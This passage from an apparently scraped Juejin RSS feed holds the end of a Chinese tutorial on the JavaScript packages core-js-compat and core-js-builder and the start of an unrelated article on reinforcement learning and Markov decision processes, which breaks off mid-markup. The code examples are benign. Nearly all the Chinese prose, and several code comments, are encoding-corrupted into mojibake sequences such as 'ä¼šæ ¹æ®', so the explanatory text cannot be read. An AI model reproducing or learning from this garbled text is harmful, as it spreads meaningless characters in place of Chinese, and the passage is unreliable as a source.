<p>compatä¼šæ ¹æ®æˆ‘ä»¬è®¾ç½®çš„æµè§ˆå™¨å…¼å®¹æ€§é…ç½®ï¼Œè¾“å‡ºç‰¹æ€§åˆ—è¡¨ï¼ŒåŒ…å«ä¸¤ä¸ªå­—æ®µï¼šlistæ˜¯ä¸€ä¸ªç‰¹æ€§åç§°åˆ—è¡¨ï¼›targetsæ˜¯ä¸€ä¸ªMapç»“æ„ï¼Œkeyä¸ºç‰¹æ€§åï¼Œå€¼ä¸ºå¯ä»¥å…¼å®¹çš„æµè§ˆå™¨ã€‚å‡è®¾æˆ‘ä»¬æŠŠä¸Šé¢çš„ targetsæ”¹æˆ &gt; 50%ï¼Œæ­¤æ—¶ä¼šè¾“å‡ºç©ºå€¼ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> compat = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-compat"</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">compat</span>({
  <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 50%"</span>,
  <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
  <span class="hljs-attr">version</span>: <span class="hljs-string">"3.47"</span>,
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
{ list: [], targets: {} }
*/</span>
</code></pre>
<p>æˆ‘ä»¬å¢åŠ excludeï¼Œæ’é™¤éƒ¨åˆ†å±æ€§ï¼Œå¯ä»¥çœ‹åˆ°ç‰¹æ€§æ•°é‡å¤§å¤§å‡å°‘ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> compat = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-compat"</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">compat</span>({
  <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 10%"</span>,
  <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
  <span class="hljs-attr">exclude</span>: [<span class="hljs-string">"esnext"</span>],
  <span class="hljs-attr">version</span>: <span class="hljs-string">"3.47"</span>,
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
{
  list: [
    'es.iterator.concat',
    'es.math.sum-precise',
    'es.async-iterator.async-dispose',
    'web.dom-exception.stack',
    'web.immediate',
    'web.structured-clone'
  ],
  targets: {
    'es.iterator.concat': { 'chrome-android': '143' },
    'es.math.sum-precise': { 'chrome-android': '143' },
    'es.async-iterator.async-dispose': { 'chrome-android': '143' },
    'web.dom-exception.stack': { 'chrome-android': '143' },
    'web.immediate': { 'chrome-android': '143' },
    'web.structured-clone': { 'chrome-android': '143' }
  }
}
*/</span>
</code></pre>
<p>å†è¯•ä¸€ä¸‹inverseçš„æ•ˆæœï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> compat = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-compat"</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">compat</span>({
  <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 10%"</span>,
  <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
  <span class="hljs-attr">version</span>: <span class="hljs-string">"3.47"</span>,
  <span class="hljs-attr">inverse</span>: <span class="hljs-literal">true</span>
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
{
  list: [
    'es.symbol',
    'es.symbol.description',
    ...å…¶å®ƒç‰¹æ€§
  ],
  targets: {
    'es.symbol': {},
    'es.symbol.description': {},
    ...å…¶å®ƒç‰¹æ€§
  }
}
*/</span>
</code></pre>
<p>å› ä¸ºè¾“å‡ºçš„æ˜¯ä¸éœ€è¦å¼•å…¥core-jså…¼å®¹çš„ç‰¹æ€§ï¼Œæ‰€ä»¥ç‰¹æ€§æ•°é‡éå¸¸å¤šï¼Œè€Œä¸”targetsä¸­æ²¡æœ‰åˆ—å‡ºæ”¯æŒçš„æµè§ˆå™¨ç‰ˆæœ¬ã€‚</p>
<h3 data-id="heading-24">core-js-builder</h3>
<p>å‰é¢ä»‹ç»çš„core-js-compatæ˜¯æ¥æ”¶å‚æ•°ä¹‹åï¼Œè¾“å‡ºcore-jsçš„ç‰¹æ€§åˆ—è¡¨æ•°ç»„ã€‚è€Œcore-js-builderæ¥æ”¶ç±»ä¼¼çš„å‚æ•°ï¼Œç›´æ¥è¾“å‡ºå¼•ç”¨core-jsçš„ä»£ç ã€‚æˆ‘ä»¬é¦–å…ˆåˆ—ä¸¾ä¸€ä¸‹å‚æ•°ï¼š</p>
<ul>
<li>targets: Browserslistæ ¼å¼çš„æµè§ˆå™¨å…¼å®¹é…ç½®</li>
<li>modules: éœ€è¦è®¾ç½®å…¼å®¹æ€§é…ç½®çš„æ¨¡å—ï¼Œå¯ä»¥æ˜¯core-js/fullï¼Œä¹Ÿå¯ä»¥æ˜¯æŸä¸ªç‰¹æ€§ï¼Œç”šè‡³æ˜¯æ­£åˆ™</li>
<li>exclude: éœ€è¦æ’é™¤çš„æ¨¡å—</li>
<li>format: 'bundle'è¾“å‡ºæ‰“åŒ…åçš„æºç ï¼›'cjs'å’Œ'esm'è¾“å‡ºå¯¹åº”æ ¼å¼çš„å¼•ç”¨ä»£ç </li>
<li>filename: è¾“å‡ºçš„æ–‡ä»¶å</li>
</ul>
<p>æˆ‘ä»¬å…ˆè¯•ä¸€ä¸‹ä¾‹å­ã€‚é¦–å…ˆæ˜¯formatæ ¼å¼çš„ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> builder = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-builder"</span>);
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">funJzplp</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">builder</span>({
    <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 30%"</span>,
    <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
    <span class="hljs-attr">format</span>: <span class="hljs-string">'bundle'</span>,
  });
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
}
<span class="hljs-title function_">funJzplp</span>();

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
...ä»£ç å¾ˆé•¿ï¼Œè¿™é‡ŒèŠ‚é€‰éƒ¨åˆ†
 (function(module, exports, __webpack_require__) {
"use strict";
var NATIVE_BIND = __webpack_require__(8);
var FunctionPrototype = Function.prototype;
*/</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œbuilderå‡½æ•°è¾“å‡ºäº†éå¸¸é•¿çš„ä»£ç ï¼Œå†…å®¹å®é™…ä¸ºè¾“å‡ºçš„ç‰¹æ€§ç»è¿‡æ‰“åŒ…ä¹‹åçš„ç»“æœä»£ç ã€‚å†è¯•ä¸€ä¸‹'cjs'å’Œ'esm'ï¼Œè¾“å‡ºçš„æ˜¯å¯¹åº”æœ¨å—çš„å¼•ç”¨ä»£ç ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// format: 'cjs' è¾“å‡ºç»“æœ</span>
...ä»£ç å¾ˆé•¿ï¼Œè¿™é‡ŒèŠ‚é€‰éƒ¨åˆ†
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/modules/es.iterator.concat'</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/modules/es.math.sum-precise'</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/modules/es.async-iterator.async-dispose'</span>);
*/

<span class="hljs-comment">// format: 'esm' è¾“å‡ºç»“æœ</span>
...ä»£ç å¾ˆé•¿ï¼Œè¿™é‡ŒèŠ‚é€‰éƒ¨åˆ†
<span class="hljs-keyword">import</span> <span class="hljs-string">'core-js/modules/es.iterator.concat.js'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'core-js/modules/es.math.sum-precise.js'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'core-js/modules/es.async-iterator.async-dispose.js'</span>;
*/
</code></pre>
<p>å¦‚æœè®¾ç½®äº†filenameï¼Œcore-js-builderä¼šåˆ›å»ºè¯¥åç§°çš„æ–‡ä»¶ï¼Œå¹¶å°†ä»£ç å†™å…¥åˆ°æ–‡ä»¶ä¸­ã€‚</p>
<h2 data-id="heading-25">æ€»ç»“</h2>
<p>è¿™ç¯‡æ–‡ç« æè¿°äº†core-jsç›¸å…³åŒ…çš„ä»£ç å†…å®¹å’Œä½¿ç”¨æ–¹å¼ã€‚core-jså®é™…ä¸Šå°±æ˜¯æä¾›äº†JavaScriptä¸­ä¸€äº›APIç‰¹æ€§çš„å…¼å®¹å®ç°æ–¹å¼ã€‚å®ƒä¸å®ç°è¯­æ³•å…¼å®¹çš„Babelä¸€èµ·ï¼Œå¯ä»¥åšåˆ°å¤§éƒ¨åˆ†JavaScriptçš„å…¼å®¹æ€§ã€‚å½“ç„¶core-jså’ŒBabelä¹Ÿä¸æ˜¯ä¸‡èƒ½çš„ï¼Œå®ƒä»¬éƒ½æœ‰å„è‡ªæ— æ³•è½¬ä¹‰å’Œå…¼å®¹çš„è¯­æ³•å’Œç‰¹æ€§ã€‚</p>
<p>core-jsè¿™ä¸ªåŒ…åå­—èµ·çš„éå¸¸å¥½ï¼Œä¸€å¬å°±æ˜¯JavaScriptçš„â€œæ ¸å¿ƒâ€åŒ…ã€‚ç”±äºå®ƒå®ç°äº†å¾ˆå¤šAPIç‰¹æ€§ï¼Œè€Œä¸”å¼•ç”¨æ•°é‡éå¸¸éå¸¸å¤§ï¼Œå› æ­¤å«â€œæ ¸å¿ƒâ€ä¹Ÿä¸ä¸ºè¿‡ã€‚è™½ç„¶è¿™ä¸ªåŒ…å¼•ç”¨é‡å¾ˆå¤§ï¼Œä½†ä¸å¦‚React/Vueæˆ–è€…ä¸€äº›å…¶å®ƒåŒ…å‡ºåã€‚å› ä¸ºè¿™ä¸ªåŒ…æ˜¯å¤„ç†çš„æ›´åº•å±‚çš„å…¼å®¹æ€§æœ‰é—®é¢˜ï¼Œå› æ­¤ç”¨æˆ·æ„ŸçŸ¥ä¸å¼ºã€‚core-jsåŒ…çš„ä½œè€…è¿˜å› ä¸ºæ²¡æœ‰é’±è€Œé‡åˆ°å¾ˆå¤šé—®é¢˜ï¼Œè¿™ä¸ªåŒ…å¹¶æ²¡æœ‰è®©ä»–å˜çš„å¯Œæœ‰ã€‚</p>
<h2 data-id="heading-26">å‚è€ƒ</h2>
<ul>
<li>core-js æ–‡æ¡£<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fcore-js.io%2F" target="_blank" title="https://core-js.io/" ref="nofollow noopener noreferrer">core-js.io/</a></li>
<li>Github core-js<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzloirock%2Fcore-js" target="_blank" title="https://github.com/zloirock/core-js" ref="nofollow noopener noreferrer">github.com/zloirock/coâ€¦</a></li>
<li>è§£é”Babelæ ¸å¿ƒåŠŸèƒ½ï¼šä»è½¬ä¹‰è¯­æ³•åˆ°æ’ä»¶å¼€å‘<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fjzplp.github.io%2F2025%2Fbabel-intro.html" target="_blank" title="https://jzplp.github.io/2025/babel-intro.html" ref="nofollow noopener noreferrer">jzplp.github.io/2025/babel-â€¦</a></li>
<li>@babel/preset-env æ–‡æ¡£<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fbabeljs.io%2Fdocs%2Fbabel-preset-env" target="_blank" title="https://babeljs.io/docs/babel-preset-env" ref="nofollow noopener noreferrer">babeljs.io/docs/babel-â€¦</a></li>
<li>@babel/polyfill æ–‡æ¡£<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fbabeljs.io%2Fdocs%2Fbabel-polyfill" target="_blank" title="https://babeljs.io/docs/babel-polyfill" ref="nofollow noopener noreferrer">babeljs.io/docs/babel-â€¦</a></li>
<li>@babel/runtime æ–‡æ¡£<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fbabeljs.io%2Fdocs%2Fbabel-runtime" target="_blank" title="https://babeljs.io/docs/babel-runtime" ref="nofollow noopener noreferrer">babeljs.io/docs/babel-â€¦</a></li>
<li>Github regenerator-runtime<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffacebook%2Fregenerator%2Ftree%2Fmain%2Fpackages%2Fruntime" target="_blank" title="https://github.com/facebook/regenerator/tree/main/packages/runtime" ref="nofollow noopener noreferrer">github.com/facebook/reâ€¦</a></li>
<li>Github core-js-compat<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzloirock%2Fcore-js%2Fblob%2Fmaster%2Fpackages%2Fcore-js-compat" target="_blank" title="https://github.com/zloirock/core-js/blob/master/packages/core-js-compat" ref="nofollow noopener noreferrer">github.com/zloirock/coâ€¦</a></li>
<li>Github core-js-builder<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzloirock%2Fcore-js%2Ftree%2Fmaster%2Fpackages%2Fcore-js-builder" target="_blank" title="https://github.com/zloirock/core-js/tree/master/packages/core-js-builder" ref="nofollow noopener noreferrer">github.com/zloirock/coâ€¦</a></li>
<li>So, what's next?<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzloirock%2Fcore-js%2Fblob%2Fmaster%2Fdocs%2F2023-02-14-so-whats-next.md" target="_blank" title="https://github.com/zloirock/core-js/blob/master/docs/2023-02-14-so-whats-next.md" ref="nofollow noopener noreferrer">github.com/zloirock/coâ€¦</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸‡å­—é•¿æ–‡ï¼ææ‡‚å¼ºåŒ–å­¦ä¹ çš„åŸºç¡€çŸ¥è¯†ï¼]]></title>    <link>https://juejin.cn/post/7597058147750150154</link>    <guid>https://juejin.cn/post/7597058147750150154</guid>    <pubDate>2026-01-20T16:00:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597058147750150154" data-draft-id="7597058147750117386" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸‡å­—é•¿æ–‡ï¼ææ‡‚å¼ºåŒ–å­¦ä¹ çš„åŸºç¡€çŸ¥è¯†ï¼"/> <meta itemprop="keywords" content="é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-20T16:00:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aicoting"/> <meta itemprop="url" content="https://juejin.cn/user/933911964427818"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸‡å­—é•¿æ–‡ï¼ææ‡‚å¼ºåŒ–å­¦ä¹ çš„åŸºç¡€çŸ¥è¯†ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/933911964427818/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aicoting
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T16:00:15.000Z" title="Tue Jan 20 2026 16:00:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ¨èç›´æ¥ç½‘ç«™åœ¨çº¿é˜…è¯»ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Faicoting.cn%2F" target="_blank" title="https://aicoting.cn/" ref="nofollow noopener noreferrer">aicoting.cn</a></p>
<h3 data-id="heading-0">å¼ºåŒ–å­¦ä¹ æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>å¼ºåŒ–å­¦ä¹ ï¼ˆReinforcement Learning, RLï¼‰æ˜¯ä¸€ç±»é€šè¿‡ä¸ç¯å¢ƒäº¤äº’æ¥å­¦ä¹ æœ€ä¼˜å†³ç­–ç­–ç•¥çš„æœºå™¨å­¦ä¹ æ–¹æ³•ã€‚ä¸ç›‘ç£å­¦ä¹ ä¸åŒï¼Œå¼ºåŒ–å­¦ä¹ æ²¡æœ‰ç›´æ¥æä¾›çš„â€œæ­£ç¡®ç­”æ¡ˆâ€ï¼Œè€Œæ˜¯é€šè¿‡å¥–åŠ±ä¿¡å·ï¼ˆrewardï¼‰æ¥è¯„ä¼°è¡Œä¸ºçš„å¥½åã€‚æ™ºèƒ½ä½“ï¼ˆagentï¼‰åœ¨ç¯å¢ƒï¼ˆenvironmentï¼‰ä¸­æ‰§è¡ŒåŠ¨ä½œï¼ˆactionï¼‰ï¼Œæ ¹æ®ç¯å¢ƒåé¦ˆè·å¾—å¥–åŠ±ï¼Œå¹¶è§‚å¯ŸçŠ¶æ€ï¼ˆstateï¼‰å˜åŒ–ã€‚</p>
<p>å¼ºåŒ–å­¦ä¹ çš„ç›®æ ‡æ˜¯å­¦ä¹ ä¸€ä¸ªç­–ç•¥ï¼Œä½¿å¾—æ™ºèƒ½ä½“åœ¨é•¿æœŸäº¤äº’ä¸­è·å¾—ç´¯è®¡å¥–åŠ±æœ€å¤§åŒ–ã€‚å…¸å‹æ–¹æ³•åŒ…æ‹¬åŸºäºå€¼å‡½æ•°çš„ç­–ç•¥ï¼ˆå¦‚ Q-learningã€SARSAï¼‰ã€åŸºäºç­–ç•¥ä¼˜åŒ–çš„æ–¹æ³•ï¼ˆå¦‚ Policy Gradientï¼‰ã€ä»¥åŠç»“åˆæ·±åº¦ç¥ç»ç½‘ç»œçš„æ·±åº¦å¼ºåŒ–å­¦ä¹ ï¼ˆDeep RLï¼‰ã€‚å¦‚ä»Šï¼Œå¼ºåŒ–å­¦ä¹ å·²ç»åœ¨æœºå™¨äººæ§åˆ¶ã€æ¸¸æˆæ™ºèƒ½ã€èµ„æºè°ƒåº¦å’Œè‡ªåŠ¨é©¾é©¶ç­‰é¢†åŸŸé€æ­¥é“ºå¼€ã€‚</p>
<h3 data-id="heading-1">é©¬å°”å¯å¤«å†³ç­–è¿‡ç¨‹</h3>
<p>é©¬å°”å¯å¤«å†³ç­–è¿‡ç¨‹ï¼ˆMDPï¼‰æ˜¯å¼ºåŒ–å­¦ä¹ å’Œå†³ç­–ç†è®ºä¸­çš„æ ¸å¿ƒæ•°å­¦æ¡†æ¶ï¼Œç”¨äºæè¿°å…·æœ‰éšæœºæ€§å’Œåºåˆ—å†³ç­–ç‰¹å¾çš„ç¯å¢ƒã€‚MDP å‡è®¾ç¯å¢ƒçš„çŠ¶æ€éšæ—¶é—´å˜åŒ–ï¼Œå¹¶ä¸”æœªæ¥çŠ¶æ€çš„è½¬ç§»åªä¾èµ–äºå½“å‰çŠ¶æ€å’Œæ™ºèƒ½ä½“çš„è¡Œä¸ºï¼Œè€Œä¸è¿‡å»çŠ¶æ€æ— å…³ï¼Œè¿™å°±æ˜¯ç»å…¸çš„â€œé©¬å°”å¯å¤«æ€§â€å‡è®¾ã€‚</p>
<p>é©¬å°”å¯å¤«å†³ç­–è¿‡ç¨‹ï¼ˆMDPï¼‰æ˜¯ä¸€ä¸ªå››å…ƒç»„<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>S</mi><mo separator="true">,</mo><mi>A</mi><mo separator="true">,</mo><mi>P</mi><mo separator="true">,</mo><mi>R</mi><mo separator="true">,</mo><mi>Î³</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(S,A,P,R,Î³)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span><span class="mclose">)</span></span></span></span></span>ï¼Œå…¶ä¸­ï¼š</p>
<ol>
<li>çŠ¶æ€ç©ºé—´ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span>ï¼šè¡¨ç¤ºç¯å¢ƒå¯èƒ½å¤„äºçš„æ‰€æœ‰çŠ¶æ€é›†åˆï¼Œæ¯ä¸ªçŠ¶æ€ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>âˆˆ</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">sâˆˆS</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"/><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span> æè¿°äº†ç¯å¢ƒåœ¨æŸä¸€æ—¶åˆ»çš„æƒ…å†µã€‚</li>
<li>åŠ¨ä½œç©ºé—´ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span>ï¼šè¡¨ç¤ºæ™ºèƒ½ä½“åœ¨æ¯ä¸ªçŠ¶æ€ä¸‹å¯é€‰æ‹©çš„æ‰€æœ‰åŠ¨ä½œé›†åˆï¼ŒåŠ¨ä½œå†³å®šæ™ºèƒ½ä½“å¯¹ç¯å¢ƒçš„å¹²é¢„ã€‚</li>
<li>çŠ¶æ€è½¬ç§»æ¦‚ç‡ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>s</mi><mtext>â€²</mtext><mi mathvariant="normal">âˆ£</mi><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(sâ€²|s,a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mord">â€²âˆ£</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span></span></span></span></span>ï¼šæè¿°åœ¨çŠ¶æ€ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math 